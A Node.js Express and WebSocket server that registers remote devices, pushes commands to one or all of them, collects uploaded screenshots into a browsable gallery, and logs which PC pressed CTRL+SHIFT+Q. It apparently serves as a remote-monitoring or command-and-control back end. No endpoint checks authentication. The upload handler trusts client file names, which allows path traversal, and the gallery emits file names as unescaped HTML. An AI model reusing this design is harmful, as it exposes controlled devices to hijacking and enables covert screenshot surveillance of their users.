const express = require("express")
const WebSocket = require("ws")
const multer = require("multer")
const path = require("path")
const fs = require("fs")

const app = express();
const upload = multer({dest:"uploads/"});
 
const server = app.listen(3000,()=>{
    console.log("server running at 3000")
})
const wss = new WebSocket.Server({noServer:true});

const clients = new Map();
const ackedClients = new Set()
let connectFlag = false;

wss.on("connection", (ws) => {
  let deviceName = null;

  ws.on("message", (value) => {
    const msg = value.toString();
    if(msg.startsWith("ACK:")){
      const ackDevice = msg.split(":")[1];
      ackedClients.add(ackDevice)
      console.log(`Ack recived. Total : ${ackedClients.size} / ${clients.size}`)
    }
    else if(msg.startsWith("Connected")) {
      deviceName = msg.split(":")[1].trim();

      // Close old connection if already exists
      if (clients.has(deviceName)) {
        const old = clients.get(deviceName);
        if (old.readyState === WebSocket.OPEN) old.close();
      }

      clients.set(deviceName, ws);
      console.log("Connected:", deviceName);
    }else {
      console.log(`Message from ${deviceName || "unknown"}`, msg);
    }
  });

  ws.on("close", () => {
    if (deviceName && clients.get(deviceName) === ws) {
      clients.delete(deviceName);
      console.log("Disconnected:", deviceName);
    }
  });
});

server.on("upgrade",(request,socket,head)=>{
    wss.handleUpgrade(request,socket,head,ws=>{
        wss.emit("connection",ws,request)
    })
})

app.get("/shouldconnect",(req,res)=>{
  res.json({connect:connectFlag})
})
app.get("/setconnect/:value",(req,res)=>{
  connectFlag =req.params.value === "true";
  res.send(`connectFlag set to ${connectFlag}`);
})

app.post("/upload",upload.single("screenshot"),(req,res)=>{
    const savePath = path.join("uploads",req.file.originalname);
    fs.renameSync(req.file.path,savePath);
    console.log("saved screenshot",req.file.originalname);
    res.send("Saved");
})
app.get("/clients", (req, res) => {
  const connectedClients = Array.from(clients.keys()).map((deviceName, index) => ({
    id: index,
    deviceName
  }));
  res.json(connectedClients);
});


app.get("/send", (req, res) => {
  const i = parseInt(req.query.i); // use ?i=0
  const msg = req.query.msg;

  if (isNaN(i) || !msg)
    return res.send("Usage: /send?i=0&msg=yourMessage");

  const clientArray = Array.from(clients.values());
  const target = clientArray[i];

  if (!target) return res.send(`No client at index ${i}`);

  if (target.readyState === WebSocket.OPEN) {
    target.send(msg);
    const deviceName = Array.from(clients.keys())[i];
    res.send(`Message sent to ${deviceName} (i=${i}): ${msg}`);
  } else {
    res.send(`Client at i=${i} is disconnected`);
  }
});


app.use("/uploads", express.static(path.join(__dirname, "uploads")));

app.get("/listuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err) return res.status(500).send("Failed to read uploads folder");

    const imageUrls = files.map(file => `http://localhost:3000/uploads/${file}`);
    res.json(imageUrls);
  });
});
app.get("/latestupload", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");

    // Get the newest file by modified time
    const latestFile = files
      .map(file => ({ file, time: fs.statSync(path.join(dirPath, file)).mtime }))
      .sort((a, b) => b.time - a.time)[0].file;

    res.sendFile(path.join(dirPath, latestFile));
  });
});
app.get("/showuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");

    // Filter only image files (optional)
    const images = files.filter(f => /\.(png|jpg|jpeg|gif)$/i.test(f));

    // Build simple HTML to show all images
    let html = "<h1>Uploaded Images</h1>";
    images.forEach(file => {
      html += `<div><img src="/uploads/${file}" style="max-width:500px;margin:10px"/><p>${file}</p></div>`;
    });

    res.send(html);
  });
});


app.get("/broadcast", (req, res) => {
  const msg = req.query.msg;
  if (!msg) return res.send("Usage: /broadcast?msg=yourMessage");

  for (const ws of clients.values()) {
    if (ws.readyState === WebSocket.OPEN) ws.send(msg);
  }

  res.send("Message broadcasted to all connected devices");
});

let lastTrackedDevice = null;

app.get("/posttrace", (req, res) => {
  const pcName = req.query.pc_id?.trim();
  if (!pcName) return res.status(400).send("Missing pc_id");

  lastTrackedDevice = pcName;
  console.log("Tracked device:", pcName);
  res.send("Device tracked");
});

app.get("/trace", (req, res) => {
  if (!lastTrackedDevice)
    return res.json({ message: "No device has been tracked yet" });

  const devices = Array.from(clients.keys());
  const trackedIndex = devices.indexOf(lastTrackedDevice);

  res.json({
    "CTRL+SHIFT+Q pressed UserIndex": trackedIndex >= 0 ? trackedIndex : "Not connected",
    "deviceId": lastTrackedDevice
  });
});

